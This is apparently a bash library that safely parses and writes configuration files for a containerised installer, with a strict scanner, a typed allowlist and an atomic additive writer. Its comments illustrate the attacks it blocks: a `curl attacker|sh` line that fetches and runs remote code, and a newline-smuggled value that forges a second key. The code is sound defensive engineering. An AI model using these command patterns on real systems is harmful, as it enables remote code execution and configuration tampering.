#!/usr/bin/env bash
# The two config files (D2/D4): ~/.mythical/mythical.conf is host-only and never mounted;
# ~/.mythical/<product>.conf is bind-mounted read-write into that product's container.
#
# <product>.conf is UNTRUSTED INPUT (D19). It is attacker-controlled after a container compromise,
# so it is NEVER sourced, eval'd or shell-expanded. Restricting what a file may MEAN does nothing
# about what happens while READING it: `KEY=$(curl attacker|sh)` executes at source time, and an
# allowlist applied to the output cannot undo that. Everything below is a pure scanner.
#
# PURE library — no side effects at source time, and no `set -euo pipefail` (that would flip the
# sourcing shell). Every function checks statuses explicitly.

MI_CONF_MAXLEN=4096
# Whole-file ceiling for the container-writable <product>.conf. SNAP_LIMIT is one byte more, so a
# bounded read that comes back full proves the original was over the ceiling. See _mi_conf_snap.
# Not read anywhere in THIS file — the bounded-read logic that consumes them is Task 4's
# _mi_conf_snap. Declared here (not there) because the ceiling is a property of the format, not of
# one reader.
# shellcheck disable=SC2034   # unused until Task 4 wires _mi_conf_snap; see comment above
MI_CONF_MAXBYTES=1048576
# shellcheck disable=SC2034   # unused until Task 4 wires _mi_conf_snap; see comment above
MI_CONF_SNAP_LIMIT=1048577
MI_CONF_MARKER_PREFIX='#mythical-conf-sha256='

# --- byte-class gate -----------------------------------------------------------------------------
# Refuse a file containing ANY control byte other than the line separator (\n): NUL, CR, TAB,
# vertical tab, DEL, the lot.
#
# This MUST run on the FILE, before a single line reaches a shell variable. bash strings cannot hold
# a NUL byte, so a `grep`/`read`-based check physically cannot see one — the byte simply vanishes on
# its way into the variable and a value silently changes meaning between what was on disk and what
# was validated. `tr` and `cmp` operate on bytes, so they can.
#
# Deleting the class and comparing to the original is the portable test: identical ⇒ none present.
# Octal ranges are understood by both GNU and BSD tr. \012 (newline) is deliberately absent from the
# ranges below, so it survives; \011 (tab) is inside \000-\011 and is therefore refused.
_mi_conf_bytes_ok() {
  # shellcheck disable=SC2094   # both sides only READ $1; nothing in this pipeline writes it
  LC_ALL=C tr -d '\000-\011\013-\037\177' < "$1" 2>/dev/null | cmp -s - "$1"
}

# rc 0 iff the value contains only permitted characters.
# Permitted: printable ASCII (space included) and every byte >= 0x80, so a UTF-8 path such as
# /Users/José/work is accepted — refusing non-ASCII would break real operators and buys nothing,
# because the danger is control and shell metacharacters, not accents.
# Refused in addition: $ ` \ — inert here (nothing is ever expanded) but no legitimate value needs
# them, and their absence is what lets a reader stop worrying. Stated limitation: a path containing
# one of the three is unsupported.
#
# The control-character check is NOT redundant with the file-level byte gate. That gate protects the
# READ path; this function is also the WRITE path's validator, where the value arrives from a caller
# rather than from a file. A newline here is exactly D19's "a value containing a newline must not be
# able to forge a second key" — without this test, `mi_conf_family_add KEY $'a\nMYTHICAL_NET=evil'`
# would write two lines and the forgery would be complete.
#
# `local LC_ALL=C` forces [[:cntrl:]] to mean the ASCII control set rather than whatever the
# operator's locale defines (same technique lib/ledger.sh uses for byte collation). NUL needs no
# test: a bash variable cannot hold one.
_mi_conf_value_ok() {
  local v="$1"
  local LC_ALL=C
  [ "${#v}" -le "$MI_CONF_MAXLEN" ] || return 1
  # `*\\*` for the backslash, not `*'\'*`: both match a literal backslash, but shellcheck reads the
  # quoted form as a botched quote escape (SC1003) and CI fails on info-level findings.
  case "$v" in
    *[[:cntrl:]]*)    return 1 ;;   # newline, CR, TAB, ESC, … — the write-path forgery guard
    *'$'*|*'`'*|*\\*) return 1 ;;
    ' '*|*' ')        return 1 ;;   # unambiguous round-trip: no leading/trailing space
  esac
  return 0
}

# rc 0 iff the key is MYTHICAL_ followed by one or more of [A-Z0-9_].
# Written as "strip the prefix, then reject any character outside the class" because a bash `case`
# glob cannot express "every character matches" — `MYTHICAL_[A-Z0-9_]*` would accept MYTHICAL_A!.
_mi_conf_key_ok() {
  local k="$1" rest
  # Bracket ranges are LOCALE-COLLATED unless forced to byte order: in some locales [A-Z] matches
  # more than the 26 ASCII letters. LC_ALL=C makes the grammar mean exactly what it says.
  local LC_ALL=C
  [ "${#k}" -le 128 ] || return 1
  rest="${k#MYTHICAL_}"
  [ "$rest" != "$k" ] || return 1              # the prefix must actually have been present
  case "$rest" in ''|*[!A-Z0-9_]*) return 1 ;; esac
  return 0
}

# Emit KEY<TAB>VALUE for every assignment line read from STDIN. Comments (#) and blank lines are
# skipped. <label> only names the source in diagnostics. rc: 0 ok · 1 malformed (already reported).
#
# Stdin rather than a path so the caller can feed it a DERIVED stream — <product>.conf's body is the
# file minus its trailing marker line, and materialising that to a temp file would mean every READ
# wrote to ~/.mythical/, which breaks "reads never write" and fails outright on a read-only home.
#
# The split is `${line%%=*}` / `${line#*=}` — parameter expansion on the FIRST '=' only, so a value
# keeps any later '='. No eval, no expansion, no substitution: the value is inert data from the byte
# it is read to the byte it is emitted.
_mi_conf_scan_stream() {
  local label="$1" line key val n=0 seen=""
  while IFS= read -r line; do
    n=$((n + 1))
    case "$line" in
      # A marker line may appear ONLY as the file's last line, and the reader strips it before
      # scanning — so one reaching the body means either a second marker or a comment masquerading
      # as one. Both must be refused: treating it as an ordinary comment lets a file the published
      # contract rejects load here, and the writer would then silently delete that line.
      "$MI_CONF_MARKER_PREFIX"*)
        mi_warn "config: $label line $n: an integrity marker may only be the final line"; return 1 ;;
      ''|'#'*) continue ;;
      *'='*)   : ;;
      *) mi_warn "config: $label line $n: not a KEY=value assignment"; return 1 ;;
    esac
    key="${line%%=*}"
    val="${line#*=}"
    if ! _mi_conf_key_ok "$key"; then
      mi_warn "config: $label line $n: invalid key name"
      return 1
    fi
    if ! _mi_conf_value_ok "$val"; then
      mi_warn "config: $label line $n: value for $key contains a forbidden character or is too long"
      return 1
    fi
    # A duplicate key is ambiguous, and is exactly what a newline-forging write would produce.
    # Refuse rather than pick a winner. The delimiters make the match whole-key, so MYTHICAL_A
    # does not appear to collide with MYTHICAL_AB.
    case "$seen" in
      *"|${key}|"*) mi_warn "config: $label line $n: duplicate key $key"; return 1 ;;
    esac
    seen="${seen}|${key}|"
    printf '%s\t%s\n' "$key" "$val"
  done
  return 0
}

# File-level preconditions, then the stream scan.
# rc: 0 ok · 1 malformed (already reported) · 3 file missing.
mi_conf_scan() {
  if [ "$#" -ne 1 ]; then mi_warn "config: mi_conf_scan needs a <file>"; return 1; fi
  local f="$1"
  [ -f "$f" ] || return 3

  if ! _mi_conf_bytes_ok "$f"; then
    mi_warn "config: $f contains control bytes (NUL, CR, TAB or similar) — refusing to parse it"
    return 1
  fi
  # A file that does not end in a newline was truncated mid-write. Empty is fine.
  if [ -s "$f" ] && [ -n "$(tail -c1 "$f" 2>/dev/null)" ]; then
    mi_warn "config: $f does not end in a newline (truncated?) — refusing to parse it"
    return 1
  fi

  # shellcheck disable=SC2094   # "$f" here is only a LABEL for diagnostics; the redirect is the read
  _mi_conf_scan_stream "$f" < "$f"
}

# --- typed validation (D19) ----------------------------------------------------------------------
# A SPEC is a newline-separated list of KEY<TAB>TYPE records. It is a PARAMETER, not a constant,
# because <product>.conf's allowlist comes from that product's manifest (Plan 3) while
# mythical.conf's is core-owned. One engine, several vocabularies.

# Decimal-string range check without shell integer conversion, so a 30-digit value cannot overflow
# `[ -ge ]` and wrap into range.
#
# NON-NEGATIVE ONLY, and the interface says so: no sign, no leading `+`, no surrounding space. Every
# setting this format expresses (retention days, ports, counts) is non-negative, and a signed
# comparison that also has to be overflow-safe is more machinery than any caller needs. A spec
# writing `int:-10:10` is a spec bug, not a value that should validate.
_mi_conf_int_ok() {
  local v="$1" min="$2" max="$3"
  case "$v" in ''|*[!0-9]*) return 1 ;; esac       # all digits, non-empty: no sign, no space, no +
  # A leading zero would be re-read as OCTAL by the `[ -ge ]` below: `010` passes an int:1:100 check
  # having compared as 8, and `0100` passes it having compared as 64 — a value textually out of range
  # validating because the shell read a different number than the file spells. `0` itself is fine.
  case "$v" in 0[0-9]*) return 1 ;; esac
  [ "${#v}" -le 18 ] || return 1                   # beyond this, shell arithmetic is not reliable
  [ "$v" -ge "$min" ] && [ "$v" -le "$max" ]
}

# Validate one value against one type. rc 0 ok, 1 reject.
_mi_conf_type_ok() {
  local type="$1" v="$2" p
  case "$type" in
    str:*)
      p="${type#str:}"
      [ "${#v}" -le "$p" ]
      ;;
    int:*:*)
      p="${type#int:}"
      _mi_conf_int_ok "$v" "${p%%:*}" "${p#*:}"
      ;;
    bool)
      case "$v" in true|false) return 0 ;; *) return 1 ;; esac
      ;;
    enum:*)
      # Delimit both sides so `re` does not match inside `red`, and an empty value does not match
      # the empty string between two pipes.
      [ -n "$v" ] || return 1
      # Reject the DELIMITER itself before matching. Quoting `"|${v}|"` makes the expansion literal,
      # so glob metacharacters in the value are inert — but a value that CONTAINS `|` forges a match
      # against the joined list rather than a member of it: for enum:red|green, v='red|green' turns
      # the pattern into *"|red|green|"*, which the subject "|red|green|" matches exactly. The format
      # has no escaping, so no enum member can legitimately contain `|`.
      case "$v" in *'|'*) return 1 ;; esac
      case "|${type#enum:}|" in *"|${v}|"*) return 0 ;; *) return 1 ;; esac
      ;;
    path:*)
      p="${type#path:}"
      [ -n "$v" ] || return 1
      case "$v" in /*) : ;; *) return 1 ;; esac
      [ "${#v}" -le "$p" ] || return 1
      # Reject a `..` PATH COMPONENT, not the substring: /srv/..hidden is a legitimate name.
      case "/${v}/" in */../*) return 1 ;; esac
      return 0
      ;;
    netname)
      # Docker network name: [A-Za-z0-9] then [A-Za-z0-9_.-]*. Additionally refuse the two special
      # modes §4b.2 bans from mythical.conf — `host` shares the host network namespace outright, and
      # `container:<name>` joins another container's. Neither is a network this installer may own.
      # An `if`, not `A && B || C`: shellcheck 0.11 does not flag that construct but the version CI
      # installs does (SC2015), and this repository already shipped three red commits on exactly
      # this pattern (828a199). The logic happens to be right either way — C runs when B fails,
      # which is what we want — but the line does not say so, and an `if` does.
      if [ -z "$v" ] || [ "${#v}" -gt 128 ]; then return 1; fi
      case "$v" in
        host|none|container:*) return 1 ;;
      esac
      case "$v" in [A-Za-z0-9]*) : ;; *) return 1 ;; esac
      case "${v#?}" in *[!A-Za-z0-9_.-]*) return 1 ;; esac
      return 0
      ;;
    *)
      mi_warn "config: internal error — unknown spec type '$type'"
      return 1
      ;;
  esac
}

# Look up a key's type in the spec. Prints the type, rc 1 if the key is not in the spec.
_mi_conf_spec_type() {
  local spec="$1" key="$2" line
  while IFS= read -r line; do
    case "$line" in
      "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;;
    esac
  done <<< "$spec"
  return 1
}

# Validate already-scanned KEY<TAB>VALUE records (in $1) against a spec. <label> names the source in
# diagnostics. rc: 0 ok · 1 rejected (reported).
# An UNKNOWN key is a rejection, never a skip (D19): ignoring it would let a compromised container
# accumulate keys that a later, wider spec silently activates.
# Records are passed as an ARGUMENT, not on stdin, because a `| while` runs the loop in a subshell
# where `rc=1` is lost — the classic way a validator reports success while having rejected something.
#
# Output is BUFFERED and emitted only if every record validates. Printing as it goes would hand a
# consumer a PREFIX of attacker-influenced configuration whenever a later record is rejected — the
# file "fails" but its first few keys were already on stdout. A caller that pipes this, or that gets
# its status handling wrong, would act on them. Nothing escapes a rejected file.
_mi_conf_validate() {
  local records="$1" label="$2" spec="$3" rc=0 line key val type out=""
  [ -n "$records" ] || return 0
  while IFS= read -r line; do
    key="${line%%$'\t'*}"
    val="${line#*$'\t'}"
    if ! type="$(_mi_conf_spec_type "$spec" "$key")"; then
      mi_warn "config: $label: unknown key $key — not permitted by this configuration schema"
      rc=1
      continue
    fi
    if ! _mi_conf_type_ok "$type" "$val"; then
      mi_warn "config: $label: value for $key is not valid for type $type"
      rc=1
      continue
    fi
    out="${out}${key}"$'\t'"${val}"$'\n'
  done <<< "$records"
  if [ "$rc" -ne 0 ]; then return "$rc"; fi
  # `if`, not `[ -n "$out" ] && printf ...` — as the last command that would return 1 on an empty
  # (legitimately keyless) config, turning a valid file into a rejection.
  if [ -n "$out" ]; then printf '%s' "$out"; fi
  return 0
}

# Parse a file and validate every record against the spec.
# rc: 0 ok · 1 rejected (reported) · 3 file missing.
mi_conf_load() {
  if [ "$#" -ne 2 ]; then mi_warn "config: mi_conf_load needs a <file> and a <spec>"; return 1; fi
  local f="$1" spec="$2" records
  records="$(mi_conf_scan "$f")" || return $?
  _mi_conf_validate "$records" "$f" "$spec"
}

# Print one raw (scanned, not spec-validated) value. rc: 0 ok · 1 parse failure · 3 absent.
#
# For MARKER-LESS files — mythical.conf, or a body already separated from its marker. A
# <product>.conf still carrying its trailing marker is REJECTED here, by design: the scanner refuses
# marker lines outright, and the way to read a product config is mi_conf_product_load, which strips
# and validates the marker first. Reading one through this function would skip the integrity gate.
_mi_conf_record_value() {
  local records="$1" key="$2" line
  while IFS= read -r line; do
    case "$line" in "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;; esac
  done <<< "$records"
  return 3
}

# Used where the caller wants a single key without a full spec — e.g. reading back a value this
# process wrote. Propagates a parse failure rather than reporting the key absent: "the file is
# hostile" and "the key is not set" must never look the same to a caller deciding whether to write.
mi_conf_get() {
  if [ "$#" -ne 2 ]; then mi_warn "config: mi_conf_get needs a <file> and a <key>"; return 1; fi
  local f="$1" key="$2" records line
  records="$(mi_conf_scan "$f")" || return $?
  while IFS= read -r line; do
    case "$line" in
      "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;;
    esac
  done <<< "$records"
  return 3
}

# --- mythical.conf — host-only, never mounted (D2/D4) ---------------------------------------------

mi_conf_family_path() { printf '%s/mythical.conf\n' "$(mi_home)"; }

# The CORE spec: keys that are product-independent. Product-scoped keys (MYTHICAL_<PRODUCT>_PORT,
# MYTHICAL_<PRODUCT>_WORK_BIND) are declared by that product's manifest and merged in by Plan 3 —
# this plan owns the engine and the core vocabulary, not the product vocabularies.
mi_conf_family_spec() {
  printf 'MYTHICAL_NET\tnetname\n'
  printf 'MYTHICAL_TELEMETRY_KEY\tstr:512\n'
}

mi_conf_family_load() {
  mi_conf_load "$(mi_conf_family_path)" "$(mi_conf_family_spec)"
}

# Has the live file changed since it was digested? This is the ONLY sanctioned read of the live file
# besides _mi_conf_snap, and it is safe for a reason worth stating: it compares a digest and never
# derives configuration from what it reads, so it cannot become an injection path. It is a NAMED
# function precisely so the structural test can permit exactly this one exception and nothing else —
# an inline `mi_digest "$f"` in a writer would be indistinguishable from a regression.
#
# Defined HERE, in Task 3, because mi_conf_family_add below is its first caller. (`_mi_conf_snap` and
# the structural test named above arrive in Task 4; this comment describes the end state.)
_mi_conf_unchanged() {
  local f="$1" pre="$2" now=""
  if [ -f "$f" ]; then now="$(mi_digest "$f")" || now="?"; fi
  [ "$now" = "$pre" ]
}

# ADD one key, preserving the rest of the file byte-for-byte (D9).
#
# ADDITIVE ONLY. Absent ⇒ written; already present with the SAME value ⇒ no-op success; present with
# a DIFFERENT value ⇒ REFUSED. §10a requires a re-install to leave user-owned files byte-identical
# "including an operator's hand edit", and a second product's install to make mythical.conf "gain
# keys additively" — a primitive that blind-writes cannot satisfy either, because the installer
# cannot tell its own earlier value from something the operator typed. Changing an existing value is
# a compare-and-set, which §5.2's migration paths define and Plan 4 builds; not available here.
#
# Atomic replace is correct HERE and only here: mythical.conf is never bind-mounted (§4.1a), so
# swapping the inode detaches nothing. <product>.conf must NOT be written this way — see
# mi_conf_product_add.
mi_conf_family_add() {
  # Arity BEFORE any positional expansion: under the entrypoint's `set -u`, `local val="$2"` on a
  # one-argument call aborts the CLI with "unbound variable" instead of refusing in our own words.
  if [ "$#" -ne 2 ]; then
    mi_warn "config: mi_conf_family_add needs exactly a KEY and a VALUE"; return 1
  fi
  local key="$1" val="$2" f dir tmp type existing rc
  mi_lock_assert_held "write mythical.conf"
  f="$(mi_conf_family_path)"; dir="$(dirname "$f")"

  # Validate the key and value BEFORE touching the file. A newline in a value would forge a second
  # key on the next read — the D19 "serialize safely on write" requirement — and _mi_conf_value_ok
  # rejects it along with every other control byte.
  if ! _mi_conf_key_ok "$key"; then
    mi_warn "config: refusing to write invalid key name '$key'"; return 1
  fi
  if ! type="$(_mi_conf_spec_type "$(mi_conf_family_spec)" "$key")"; then
    mi_warn "config: $key is not a key mythical.conf accepts"; return 1
  fi
  if ! _mi_conf_value_ok "$val" || ! _mi_conf_type_ok "$type" "$val"; then
    mi_warn "config: refusing to write an invalid value for $key"; return 1
  fi

  # Never overwrite a file we cannot read. A config that does not parse may be an operator's
  # half-finished edit or a hostile write; either way, silently rewriting it destroys evidence and
  # could discard settings. Refuse and report. (An absent file is fine — that is a first write.)
  # Gate on the FULL load, not merely on the syntax scan. A file holding a key outside the core
  # schema scans perfectly and fails mi_conf_family_load — so gating on the scan alone would let this
  # function "succeed" while producing a file its own reader rejects. Whatever we refuse to read, we
  # refuse to modify.
  if [ -f "$f" ] && ! mi_conf_family_load >/dev/null 2>&1; then
    mi_warn "config: $f does not load cleanly — refusing to modify it; fix or remove it first"
    return 1
  fi

  # The additive gate. mi_conf_get distinguishes absent (3) from a parse failure (1), which is why it
  # exists — "the key is not set" and "the file is hostile" must never look the same to code deciding
  # whether to write.
  if [ -f "$f" ]; then
    if existing="$(mi_conf_get "$f" "$key")"; then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ]; then
      if [ "$existing" = "$val" ]; then
        return 0                       # already exactly what we would write: nothing to do
      fi
      mi_warn "config: $key is already set to '$existing' in $f — refusing to overwrite it"
      mi_warn "  An operator's value is never replaced silently; change it by hand, or remove the line."
      return 1
    fi
    [ "$rc" -eq 3 ] || return "$rc"    # absent is the only status that authorizes a write
  fi

  tmp="$(mktemp "$dir/.mythical.conf.XXXXXX")" || { mi_warn "config: cannot create a temp file in $dir"; return 1; }
  # 0600 BEFORE any content lands: mktemp is already 0600, but making it explicit means a future
  # change to the temp mechanism cannot silently widen a file that holds bootstrap secrets.
  chmod 600 "$tmp" || { rm -f "$tmp"; mi_warn "config: cannot set mode on $tmp"; return 1; }

  # The key is known ABSENT (the gate above proved it), so this is a pure byte copy plus an append —
  # every existing byte, comment, blank line and ordering survives unchanged, which is the D9
  # guarantee stated as code rather than as a loop that could get it subtly wrong.
  local pre=""
  if [ -f "$f" ]; then
    pre="$(mi_digest "$f")" || { rm -f "$tmp"; mi_warn "config: cannot read $f"; return 1; }
    cat "$f" > "$tmp" || { rm -f "$tmp"; mi_warn "config: cannot read $f"; return 1; }
  fi
  printf '%s=%s\n' "$key" "$val" >> "$tmp"

  # Compare-and-swap on the WHOLE FILE before replacing it. The family lock serializes every other
  # mythical-ctl process, but not the two writers D9 explicitly expects: the operator in an editor,
  # and (for <product>.conf) the product's own UI. Without this, a save landing between the read
  # above and the rename below is silently discarded — §5.2's "the edit is lost" residual, which
  # the design permits only when the command REPORTS it immediately. Refusing is better than
  # reporting after the fact, and costs one extra read. It narrows the window rather than closing
  # it; residual 11 states what is left.
  if ! _mi_conf_unchanged "$f" "$pre"; then
    rm -f "$tmp"
    mi_warn "config: $f changed while we were reading it — refusing to overwrite that change; re-run"
    return 1
  fi

  # Atomic replace within the same directory, so rename() cannot cross filesystems.
  mv -f "$tmp" "$f" || { rm -f "$tmp"; mi_warn "config: cannot replace $f"; return 1; }
  return 0
}
